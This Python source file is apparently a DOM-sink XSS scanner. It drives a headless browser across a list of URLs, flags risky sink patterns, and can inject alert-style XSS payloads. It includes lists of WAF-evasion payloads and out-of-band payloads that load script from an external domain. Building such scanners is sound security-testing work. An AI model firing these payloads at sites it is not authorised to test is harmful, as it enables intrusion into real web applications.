#!/usr/bin/env python3

import asyncio
import re
import sys
import json
import argparse
import hashlib
import base64
import requests
import yaml
import random
import string
from urllib.parse import quote, urljoin, urlparse, parse_qs
from typing import List, Dict, Optional, Set, Tuple
from datetime import datetime
from dataclasses import dataclass, asdict
from pathlib import Path
import logging
import time

from playwright.async_api import async_playwright
from aiohttp import ClientSession
from tqdm import tqdm
from bs4 import BeautifulSoup


@dataclass
class SinkInfo:
    name: str
    pattern: str
    risk_level: int  # 1-5 scale
    execution_context: str
    mutation_observable: bool = False
    waf_evasion_difficulty: int = 1  # 1-5 scale

# Enhanced DOM sink patterns with risk classification
SINKS = {
    "innerHTML": SinkInfo("innerHTML", r"\.innerHTML\s*=", 4, "DOM_WRITE", True, 2),
    "outerHTML": SinkInfo("outerHTML", r"\.outerHTML\s*=", 4, "DOM_WRITE", True, 2),
    "document.write": SinkInfo("document.write", r"document\.write\s*\(", 5, "DOCUMENT_WRITE", True, 3),
    "document.writeln": SinkInfo("document.writeln", r"document\.writeln\s*\(", 5, "DOCUMENT_WRITE", True, 3),
    "eval": SinkInfo("eval", r"eval\s*\(", 5, "CODE_EXECUTION", False, 4),
    "setTimeout": SinkInfo("setTimeout", r"setTimeout\s*\(", 4, "TIMER_EXECUTION", False, 3),
    "setInterval": SinkInfo("setInterval", r"setInterval\s*\(", 4, "TIMER_EXECUTION", False, 3),
    "Function": SinkInfo("Function", r"new\s+Function\s*\(", 5, "CODE_EXECUTION", False, 4),
    "execScript": SinkInfo("execScript", r"execScript\s*\(", 5, "CODE_EXECUTION", False, 5),
    "setImmediate": SinkInfo("setImmediate", r"setImmediate\s*\(", 4, "TIMER_EXECUTION", False, 3),
    "insertAdjacentHTML": SinkInfo("insertAdjacentHTML", r"\.insertAdjacentHTML\s*\(", 4, "DOM_WRITE", True, 2),
    "createContextualFragment": SinkInfo("createContextualFragment", r"\.createContextualFragment\s*\(", 3, "DOM_FRAGMENT", True, 2),
    "GlobalEventHandlers": SinkInfo("GlobalEventHandlers", r"on\w+\s*=", 4, "EVENT_HANDLER", True, 2),
    "location.href": SinkInfo("location.href", r"location\.href\s*=", 3, "NAVIGATION", False, 2),
    "location.assign": SinkInfo("location.assign", r"location\.assign\s*\(", 3, "NAVIGATION", False, 2),
    "location.replace": SinkInfo("location.replace", r"location\.replace\s*\(", 3, "NAVIGATION", False, 2),
    "window.open": SinkInfo("window.open", r"window\.open\s*\(", 3, "NAVIGATION", False, 2),
    "history.pushState": SinkInfo("history.pushState", r"history\.pushState\s*\(", 2, "HISTORY", False, 1),
    "history.replaceState": SinkInfo("history.replaceState", r"history\.replaceState\s*\(", 2, "HISTORY", False, 1),
    "postMessage": SinkInfo("postMessage", r"\.postMessage\s*\(", 3, "MESSAGE", False, 2),
    "appendChild": SinkInfo("appendChild", r"\.appendChild\s*\(", 3, "DOM_MANIPULATION", True, 1),
    "replaceChild": SinkInfo("replaceChild", r"\.replaceChild\s*\(", 3, "DOM_MANIPULATION", True, 1),
    "insertBefore": SinkInfo("insertBefore", r"\.insertBefore\s*\(", 3, "DOM_MANIPULATION", True, 1),
    "setAttribute": SinkInfo("setAttribute", r"\.setAttribute\s*\(", 3, "ATTRIBUTE_WRITE", True, 2),
    "setAttributeNS": SinkInfo("setAttributeNS", r"\.setAttributeNS\s*\(", 3, "ATTRIBUTE_WRITE", True, 2),
    "jQuery.html": SinkInfo("jQuery.html", r"\$\([^)]*\)\.html\s*\(", 4, "JQUERY_DOM", True, 2),
    "jQuery.append": SinkInfo("jQuery.append", r"\$\([^)]*\)\.append\s*\(", 3, "JQUERY_DOM", True, 2),
    "document.domain": SinkInfo("document.domain", r"document\.domain\s*=", 4, "SECURITY_CONTEXT", False, 3),
}

# Advanced XSS payloads with WAF evasion and context-aware testing
PAYLOADS = {
    "basic": [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "javascript:alert('XSS')",
        "<svg onload=alert('XSS')>",
        "<iframe src=javascript:alert('XSS')>",
    ],
    "waf_evasion": [
        "<ScRiPt>alert(String.fromCharCode(88,83,83))</ScRiPt>",
        "<img src=x onerror=eval(atob('YWxlcnQoJ1hTUycpOw=='))>",
        "<svg/onload=window[atob('YWxlcnQ=')](1)>",
        "<iframe srcdoc='<script>parent.alert(1)</script>'>",
        "<details ontoggle=alert`1`>",
        "<math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><textarea><path onmouseover=alert(1)>",
    ],
    "context_specific": {
        "innerHTML": [
            "<img src=x onerror=alert('innerHTML')>",
            "<svg onload=alert('innerHTML')>",
            "<iframe srcdoc='<script>alert(1)</script>'>",
        ],
        "eval": [
            "alert('eval_context')",
            "1;alert('eval');1",
            "(function(){alert('eval')})();",
        ],
        "setTimeout": [
            "alert('setTimeout')",
            "(function(){alert('timer')})();",
        ],
        "location": [
            "javascript:alert('location')",
            "data:text/html,<script>alert(1)</script>",
        ]
    },
    "mutation_observer": [
        "<div id='test123'><script>alert('mutation')</script></div>",
        "<span data-test='<script>alert(1)</script>'></span>",
        "<p class='<img src=x onerror=alert(1)>'></p>",
    ]
}

# Interact.sh integration payloads
INTERACTSH_PAYLOADS = [
    "<script src='http://{domain}/xss.js'></script>",
    "<img src='http://{domain}/img.png'>",
    "<iframe src='http://{domain}/frame.html'></iframe>",
    "fetch('http://{domain}/data')",
]

# WAF signatures for detection
WAF_SIGNATURES = {
    "cloudflare": ["cf-ray", "cloudflare", "__cfduid"],
    "aws_waf": ["x-amzn-requestid", "x-amz-cf-id"],
    "akamai": ["ak-user-agent", "akamai-ghost"],
    "incapsula": ["x-iinfo", "incap_ses"],
    "sucuri": ["x-sucuri-id", "sucuri"],
    "barracuda": ["barra", "x-barracuda"],
    "f5": ["f5-x-forwarded-for", "bigip"],
    "fortinet": ["fortigate", "x-fortigate"],
}

class DOMSinkScanner:
    def __init__(self, headless: bool = True, timeout: int = 30000):
        self.headless = headless
        self.timeout = timeout
        self.results = []

    async def scan_dom_sinks(self, url: str) -> Optional[Dict]:
        """Scan a URL for DOM sink patterns"""
        try:
            async with async_playwright() as p:
                browser = await p.chromium.launch(
                    headless=True,  # Force headless mode
                    args=[
                        '--no-sandbox',
                        '--disable-setuid-sandbox',
                        '--headless=new',
                        '--disable-gpu',
                        '--disable-dev-shm-usage'
                    ]
                )
                context = await browser.new_context(
                    user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
                )
                page = await context.new_page()
                
                # Navigate to the URL
                await page.goto(url, timeout=self.timeout, wait_until="domcontentloaded")
                
                # Get page content
                content = await page.content()
                
                # Also get JavaScript content from script tags
                js_content = await page.evaluate("""
                    () => {
                        const scripts = Array.from(document.querySelectorAll('script'));
                        return scripts.map(script => script.textContent || script.innerText || '').join('\\n');
                    }
                """)
                
                full_content = content + "\n" + js_content
                matches = []

                # Check for DOM sink patterns
                for sink_name, sink_info in SINKS.items():
                    if re.search(sink_info.pattern, full_content, re.IGNORECASE):
                        matches.append(sink_name)

                await browser.close()

                if matches:
                    result = {
                        "url": url,
                        "sinks": matches,
                        "timestamp": datetime.now().isoformat(),
                        "sink_count": len(matches)
                    }
                    print(f"[+] {url} - Found {len(matches)} DOM sinks: {', '.join(matches)}")
                    return result

        except Exception as e:
            print(f"[-] Error scanning {url}: {str(e)}")
        
        return None

    async def test_payload_injection(self, url: str, payload: str) -> Optional[Dict]:
        """Test a specific payload against a URL"""
        try:
            async with async_playwright() as p:
                browser = await p.chromium.launch(
                    headless=True,  # Force headless mode
                    args=[
                        '--no-sandbox',
                        '--disable-setuid-sandbox',
                        '--headless=new',
                        '--disable-gpu',
                        '--disable-dev-shm-usage'
                    ]
                )
                context = await browser.new_context()
                page = await context.new_page()
                
                # Create test URL with payload
                test_url = f"{url}{'&' if '?' in url else '?'}test={quote(payload)}"
                
                # Navigate with payload
                await page.goto(test_url, timeout=self.timeout)
                
                # Check if payload is reflected in DOM
                content = await page.content()
                
                # Look for unencoded payload in the response
                if payload in content:
                    # Check for DOM sinks that might execute the payload
                    sinks_found = []
                    for sink_name, sink_info in SINKS.items():
                        if re.search(sink_info.pattern, content, re.IGNORECASE):
                            sinks_found.append(sink_name)
                    
                    if sinks_found:
                        result = {
                            "url": test_url,
                            "payload": payload,
                            "sinks": sinks_found,
                            "reflected": True,
                            "timestamp": datetime.now().isoformat()
                        }
                        await browser.close()
                        return result

                await browser.close()

        except Exception as e:
            print(f"[-] Error testing payload on {url}: {str(e)}")
        
        return None

    async def scan_urls(self, urls: List[str], test_payloads: bool = False) -> List[Dict]:
        """Scan multiple URLs for DOM sinks"""
        results = []
        for url in tqdm(urls, desc="Scanning URLs for DOM sinks"):
            # Basic DOM sink scan
            result = await self.scan_dom_sinks(url)
            if result:
                results.append(result)
                # If payload testing is enabled and sinks were found
                if test_payloads and result.get('sinks'):
                    print(f"[*] Testing payloads on {url} (found sinks)")
                    for payload in PAYLOADS["basic"][:3]:  # Test first 3 basic payloads
                        payload_result = await self.test_payload_injection(url, payload)
                        if payload_result:
                            results.append(payload_result)
                            break  # Stop after first successful payload
        return results

    def generate_report(self, results: List[Dict], output_file: str = "domsink_results.json"):
        """Generate a detailed report of findings"""
        report = {
            "scan_info": {
                "timestamp": datetime.now().isoformat(),
                "total_urls_scanned": len(set(r.get('url', '') for r in results)),
                "total_findings": len(results),
                "scanner": "DOMSinkScanner v2.0"
            },
            "findings": results,
            "summary": {
                "unique_sinks_found": list(set(
                    sink for r in results 
                    for sink in r.get('sinks', [])
                )),
                "high_risk_findings": [
                    r for r in results 
                    if any(sink in ['eval', 'Function', 'execScript', 'innerHTML'] 
                          for sink in r.get('sinks', []))
                ]
            }
        }
        
        # Save JSON report
        with open(output_file, 'w') as f:
            json.dump(report, f, indent=2)
        
        # Generate text summary
        print(f"\n[✓] Scan Summary:")
        print(f"    - URLs scanned: {report['scan_info']['total_urls_scanned']}")
        print(f"    - Total findings: {report['scan_info']['total_findings']}")
        print(f"    - High-risk findings: {len(report['summary']['high_risk_findings'])}")
        print(f"    - Unique sinks found: {len(report['summary']['unique_sinks_found'])}")
        print(f"    - Results saved to: {output_file}")
        
        return report

async def main():
    parser = argparse.ArgumentParser(description="DOM Sink Scanner for XSS Testing")
    parser.add_argument("urls", help="File containing URLs to scan (one per line)")
    parser.add_argument("-o", "--output", default="domsink_results.json", 
                       help="Output file for results")
    parser.add_argument("--test-payloads", action="store_true", 
                       help="Test XSS payloads on URLs with DOM sinks")
    parser.add_argument("--timeout", type=int, default=30000,
                       help="Timeout for page loads in milliseconds")
    parser.add_argument("--visible", action="store_true",
                       help="Run browser in visible mode (not headless)")
    
    args = parser.parse_args()
    
    # Read URLs from file
    try:
        with open(args.urls, 'r') as f:
            urls = [line.strip() for line in f if line.strip() and not line.lstrip().startswith('#')]
    except FileNotFoundError:
        print(f"[-] Error: File '{args.urls}' not found")
        sys.exit(1)
    if not urls:
        print("[-] No valid URLs found in input file")
        sys.exit(1)
    
    print(f"[*] Starting DOM sink scan on {len(urls)} URLs")
    print(f"[*] Payload testing: {'Enabled' if args.test_payloads else 'Disabled'}")
    
    # Initialize scanner
    scanner = DOMSinkScanner(
        headless=not args.visible,
        timeout=args.timeout
    )
    
    # Perform scan
    results = await scanner.scan_urls(urls, test_payloads=args.test_payloads)
    
    # Generate report
    scanner.generate_report(results, args.output)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n[-] Scan interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"[-] Fatal error: {str(e)}")
        sys.exit(1)